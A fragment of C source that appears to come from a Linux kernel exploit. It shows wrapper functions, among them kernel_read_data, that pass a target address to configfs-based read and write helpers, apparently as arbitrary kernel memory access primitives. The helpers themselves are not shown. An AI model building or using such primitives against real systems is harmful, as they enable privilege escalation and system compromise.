  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
